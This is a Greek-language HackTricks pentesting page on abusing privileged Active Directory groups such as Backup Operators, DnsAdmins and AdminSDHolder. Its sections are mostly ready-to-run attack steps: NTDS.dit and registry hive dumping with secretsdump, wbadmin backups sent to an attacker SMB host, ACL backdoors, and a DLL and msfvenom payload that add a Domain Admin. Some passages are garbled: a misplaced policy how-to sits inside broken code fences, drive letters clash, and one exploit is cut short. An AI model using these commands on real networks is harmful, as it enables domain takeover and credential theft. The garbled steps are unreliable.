# Ομάδες με ιδιωτικά δικαιώματα

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Ομάδες με γνωστά δικαιώματα διαχείρισης

* **Διαχειριστές (Administrators)**
* **Διαχειριστές του τομέα (Domain Admins)**
* **Διαχειριστές της επιχείρησης (Enterprise Admins)**

## Χειριστές λογαριασμών (Account Operators)

Αυτή η ομάδα έχει τη δυνατότητα να δημιουργεί λογαριασμούς και ομάδες που δεν είναι διαχειριστές στον τομέα. Επιπλέον, επιτρέπει την τοπική σύνδεση στον ελεγκτή του τομέα (Domain Controller - DC).

Για την εντοπισμό των μελών αυτής της ομάδας, εκτελείται η παρακάτω εντολή:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Επιτρέπεται η προσθήκη νέων χρηστών, καθώς και η τοπική σύνδεση στο DC01.

## Ομάδα AdminSDHolder

Ο έλεγχος πρόσβασης (ACL) της ομάδας **AdminSDHolder** είναι κρίσιμος, καθώς ορίζει τα δικαιώματα για όλες τις "προστατευμένες ομάδες" εντός του Active Directory, συμπεριλαμβανομένων των ομάδων υψηλών προνομίων. Αυτός ο μηχανισμός εξασφαλίζει την ασφάλεια αυτών των ομάδων αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.

Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσαρμόζοντας το ACL της ομάδας **AdminSDHolder**, χορηγώντας πλήρη δικαιώματα σε έναν κανονικό χρήστη. Αυτό θα δώσει αποτελεσματικά σε αυτόν τον χρήστη πλήρη έλεγχο επί όλων των προστατευμένων ομάδων. Εάν τα δικαιώματα αυτού του χρήστη τροποποιηθούν ή αφαιρεθούν, θα αποκατασταθούν αυτόματα εντός μίας ώρας λόγω του σχεδιασμού του συστήματος.

Οι εντολές για να ελέγξετε τα μέλη και να τροποποιήσετε τα δικαιώματα περιλαμβάνουν:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Ένα σενάριο είναι διαθέσιμο για να επιταχύνει τη διαδικασία ανάκτησης: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Για περισσότερες λεπτομέρειες, επισκεφθείτε το [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Η συμμετοχή σε αυτήν την ομάδα επιτρέπει την ανάγνωση διαγραμμένων αντικειμένων του Active Directory, τα οποία μπορεί να αποκαλύψουν ευαίσθητες πληροφορίες:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Πρόσβαση στον ελεγκτή του τομέα

Η πρόσβαση σε αρχεία στον DC είναι περιορισμένη εκτός αν ο χρήστης ανήκει στην ομάδα `Server Operators`, η οποία αλλάζει το επίπεδο πρόσβασης.

### Ανέλιξη προνομιών

Χρησιμοποιώντας τα εργαλεία `PsService` ή `sc` από το Sysinternals, μπορεί κανείς να επιθεωρήσει και να τροποποιήσει τις άδειες των υπηρεσιών. Για παράδειγμα, η ομάδα `Server Operators` έχει πλήρη έλεγχο πάνω σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και ανέλιξη προνομιών:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Αυτή η εντολή αποκαλύπτει ότι οι `Server Operators` έχουν πλήρη πρόσβαση, επιτρέποντας την παρέμβαση σε υπηρεσίες για αυξημένα προνόμια.

## Τελεστές Αντιγράφων Ασφαλείας

Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων του `DC01` λόγω των προνομίων `SeBackup` και `SeRestore`. Αυτά τα προνόμια επιτρέπουν τη δυνατότητα διάσχισης φακέλων, λίστας και αντιγραφής αρχείων, ακόμα και χωρίς ρητές άδειες, χρησιμοποιώντας τη σημαία `FILE_FLAG_BACKUP_SEMANTICS`. Είναι απαραίτητη η χρήση συγκεκριμένων σεναρίων για αυτήν τη διαδικασία.

Για να εμφανιστούν οι μέλη της ομάδας, εκτελέστε:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Τοπική Επίθεση

Για να αξιοποιήσουμε αυτά τα προνόμια τοπικά, ακολουθούνται τα παρακάτω βήματα:

1. Εισαγωγή απαραίτητων βιβλιοθηκών:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ενεργοποίηση και επαλήθευση του `SeBackupPrivilege`:

```plaintext
Για να ενεργοποιήσετε το `SeBackupPrivilege` στο σύστημα σας, ακολουθήστε τα παρακάτω βήματα:

1. Ανοίξτε το "Local Security Policy" στον υπολογιστή σας.
2. Πηγαίνετε στο "Local Policies" > "User Rights Assignment".
3. Αναζητήστε το "Backup files and directories" στη λίστα δικαιωμάτων χρήστη.
4. Διπλό κλικ στο "Backup files and directories" και προσθέστε τους χρήστες ή τις ομάδες που θέλετε να έχουν αυτό το δικαίωμα.
5. Κάντε επανεκκίνηση τον υπολογιστή σας για να εφαρμοστούν οι αλλαγές.

Για να επαληθεύσετε ότι το `SeBackupPrivilege` έχει ενεργοποιηθεί σωστά, μπορείτε να χρησιμοποιήσετε την εντολή `whoami /priv` στο Command Prompt. Θα πρέπει να εμφανιστεί η εξής γραμμή:

```
SeBackupPrivilege         Επιτρέπεται
```

Αν δεν εμφανίζεται αυτή η γραμμή, επαναλάβετε τα παραπάνω βήματα για να ενεργοποιήσετε το `SeBackupPrivilege`.
```
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Πρόσβαση και αντιγραφή αρχείων από περιορισμένους φακέλους, για παράδειγμα:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Επίθεση στο AD

Ο άμεσος πρόσβαση στο σύστημα αρχείων του Domain Controller επιτρέπει την κλοπή της βάσης δεδομένων `NTDS.dit`, η οποία περιέχει όλα τα NTLM hashes για τους χρήστες και τους υπολογιστές του τομέα.

#### Χρήση του diskshadow.exe

1. Δημιουργία ενός αντίγραφου σκιάς του δίσκου `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Αντιγράψτε το `NTDS.dit` από το αντίγραφο σκιάς:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Εναλλακτικά, χρησιμοποιήστε το `robocopy` για την αντιγραφή αρχείων:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Εξαγωγή των αρχείων `SYSTEM` και `SAM` για την ανάκτηση των κατακερματισμένων τιμών:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Ανάκτηση όλων των κατακερματισμένων τιμών από το `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Χρήση του wbadmin.exe

1. Διαμορφώστε το σύστημα αρχείων NTFS για τον διακομιστή SMB στη μηχανή του επιτιθέμενου και κρατήστε τα διαπιστευτήρια SMB στη μηχανή-στόχο.
2. Χρησιμοποιήστε το `wbadmin.exe` για τη δημιουργία αντιγράφου ασφαλείας του συστήματος και την εξαγωγή του αρχείου `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Για μια πρακτική επίδειξη, δείτε το [ΒΙΝΤΕΟ ΔΕΙΓΜΑΤΟΣ ΜΕ ΤΟΝ IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Τα μέλη της ομάδας **DnsAdmins** μπορούν να εκμεταλλευτούν τα προνόμιά τους για να φορτώσουν ένα αυθαίρετο DLL με προνόμια SYSTEM σε έναν διακομιστή DNS, που συχνά φιλοξενείται σε ελεγκτές τομέα. Αυτή η δυνατότητα επιτρέπει σημαντικές δυνατότητες εκμετάλλευσης.

Για να εμφανίσετε τα μέλη της ομάδας DnsAdmins, χρησιμοποιήστε:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Εκτέλεση αυθαίρετου DLL

Τα μέλη μπορούν να κάνουν τον διακομιστή DNS να φορτώσει ένα αυθαίρετο DLL (είτε τοπικά είτε από απομακρυσμένο κοινόχρηστο φάκελο) χρησιμοποιώντας εντολές όπως:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Είναι απαραίτητο να επανεκκινήσετε την υπηρεσία DNS (η οποία μπορεί να απαιτεί επιπλέον δικαιώματα) για να φορτωθεί το DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Για περισσότερες λεπτομέρειες σχετικά με αυτό το διάνυσμα επίθεσης, ανατρέξτε στο ired.team.

#### Mimilib.dll
Είναι επίσης εφικτό να χρησιμοποιηθεί το mimilib.dll για την εκτέλεση εντολών, τροποποιώντας το για να εκτελεί συγκεκριμένες εντολές ή αντίστροφα κελύφη. [Ελέγξτε αυτήν την ανάρτηση](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) για περισσότερες πληροφορίες.

### Εγγραφή WPAD για MitM
Οι DnsAdmins μπορούν να παραπλανήσουν τις εγγραφές DNS για να πραγματοποιήσουν επιθέσεις Man-in-the-Middle (MitM) δημιουργώντας μια εγγραφή WPAD μετά την απενεργοποίηση της λίστας αποκλεισμού ερωτήσεων. Εργαλεία όπως το Responder ή το Inveigh μπορούν να χρησιμοποιηθούν για την πλαστογράφηση και την καταγραφή της κίνησης του δικτύου.

### Αναγνώστες Καταγραφής Συμβάντων
Τα μέλη μπορούν να έχουν πρόσβαση στις καταγραφές συμβάντων, ενδεχομένως εντοπίζοντας ευαίσθητες πληροφορίες, όπως κωδικούς πρόσβασης κατά κείμενο ή λεπτομέρειες εκτέλεσης εντολών:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Άδειες Windows Exchange
Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο του τομέα, πιθανώς χορηγώντας προνόμια DCSync. Οι τεχνικές για την ανέλιξη προνομίων εκμεταλλευόμενοι αυτήν την ομάδα αναλύονται στο αποθετήριο GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Διαχειριστές Hyper-V
Οι Διαχειριστές Hyper-V έχουν πλήρη πρόσβαση στο Hyper-V, το οποίο μπορεί να εκμεταλλευτεί για να αποκτήσει έλεγχο επάνω σε εικονικούς ελεγκτές τομέα. Αυτό περιλαμβάνει την κλωνοποίηση ζωντανών DCs και την εξαγωγή NTLM hashes από το αρχείο NTDS.dit.

### Παράδειγμα Εκμετάλλευσης
Ο Mozilla Maintenance Service του Firefox μπορεί να εκμεταλλευτεί από τους Διαχειριστές Hyper-V για να εκτελέσουν εντολές ως SYSTEM. Αυτό περιλαμβάνει τη δημιουργία ενός σκληρού συνδέσμου προς ένα προστατευμένο αρχείο SYSTEM και την αντικατάστασή του με ένα κακόβουλο εκτελέσιμο αρχείο:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Σημείωση: Η εκμετάλλευση των σκληρών συνδέσμων έχει αντιμετωπιστεί σε πρόσφατες ενημερώσεις των Windows.

## Διαχείριση Οργανισμού

Σε περιβάλλοντα όπου έχει εγκατασταθεί το **Microsoft Exchange**, υπάρχει μια ειδική ομάδα που ονομάζεται **Διαχείριση Οργανισμού** και διαθέτει σημαντικές δυνατότητες. Αυτή η ομάδα έχει την εξουσία να **έχει πρόσβαση στα ηλεκτρονικά ταχυδρομεία όλων των χρηστών του τομέα** και να διατηρεί **πλήρη έλεγχο στην Μονάδα Οργανωτικών Ομάδων 'Microsoft Exchange Security Groups'**. Αυτός ο έλεγχος περιλαμβάνει την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να εκμεταλλευτεί για ανέλιξη προνομιακών δικαιωμάτων.

### Εκμετάλλευση Προνομιακών Δικαιωμάτων και Εντολές

#### Τελεστές Εκτύπωσης
Τα μέλη της ομάδας **Τελεστές Εκτύπωσης** διαθέτουν αρκετά προνόμια, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **συνδεθούν τοπικά σε έναν ελεγκτή τομέα**, να τον κλείσουν και να διαχειριστούν εκτυπωτές. Για να εκμεταλλευτούν αυτά τα προνόμια, ειδικά αν το **`SeLoadDriverPrivilege`** δεν είναι ορατό κάτω από ένα μη ανυψωμένο πλαίσιο, είναι απαραίτητο να παρακάμψετε τον Έλεγχο Χρηστών Λογαριασμού (UAC).

Για να εμφανιστούν οι μέλη αυτής της ομάδας, χρησιμοποιείται η παρακάτω εντολή PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Για περισσότερες λεπτομερείς τεχνικές εκμετάλλευσης που σχετίζονται με το **`SeLoadDriverPrivilege`**, θα πρέπει να ανατρέξετε σε συγκεκριμένους πόρους ασφαλείας.

#### Χρήστες Απομακρυσμένης Επιφάνειας Εργασίας
Τα μέλη αυτής της ομάδας έχουν πρόσβαση σε υπολογιστές μέσω του πρωτοκόλλου Απομακρυσμένης Επιφάνειας Εργασίας (RDP). Για να απαριθμήσετε αυτά τα μέλη, υπάρχουν διαθέσιμες εντολές PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Περαιτέρω εισαγωγή στην εκμετάλλευση του RDP μπορεί να βρεθεί σε αφιερωμένους πόρους για το pentesting.

#### Χρήστες Απομακρυσμένης Διαχείρισης
Τα μέλη μπορούν να έχουν πρόσβαση σε υπολογιστές μέσω της **Απομακρυσμένης Διαχείρισης των Windows (WinRM)**. Η απαρίθμηση αυτών των μελών επιτυγχάνεται μέσω:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Για τεχνικές εκμετάλλευσης που σχετίζονται με το **WinRM**, πρέπει να ανατρέξετε σε συγκεκριμένη τεκμηρίωση.

#### Τελεστές Διακομιστή
Αυτή η ομάδα έχει δικαιώματα για να πραγματοποιήσει διάφορες ρυθμίσεις στους ελεγκτές του τομέα, συμπεριλαμβανομένων των δικαιωμάτων αντιγραφής ασφαλείας και επαναφοράς, αλλαγής της ώρας του συστήματος και απενεργοποίησης του συστήματος. Για να απαριθμήσετε τα μέλη, χρησιμοποιήστε την παρακάτω εντολή:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Αναφορές <a href="#αναφορές" id="αναφορές"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
